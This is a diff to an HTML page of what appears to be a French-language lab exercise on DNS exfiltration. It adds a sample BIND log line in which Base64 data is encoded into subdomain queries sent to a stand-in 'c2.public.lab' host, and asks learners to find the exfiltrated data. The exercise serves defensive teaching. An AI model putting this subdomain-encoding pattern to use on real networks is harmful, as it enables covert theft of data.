@@ -1705,7 +1705,12 @@ Invoke-RestMethod -Uri $URL -Method Post -ContentType "multipart/form-data; boun
 <pre><code>/var/log/bind/bind.log</code></pre>
 
 <p>Trouvez la ligne contenant les données exfiltrées et répondez à la question.</p>
+<pre><code>
+05-Mar-2021 10:48:32.650 queries: info: client @0x7fc48402dfc0 172.16.1.11#60625 (ENCODED_DATA_GOES_HERE.c2.public.lab): query: ENCODED_DATA_GOES_HERE.c2.public.lab IN A +E(0)DCK (172.16.0.5)
+</code></pre>
 
+<p><b>Note :</b>  
+La chaîne <code>ENCODED_DATA_GOES_HERE</code> sera remplacée par votre propre encodage Base64.</p>
   </div>
 
 </div>
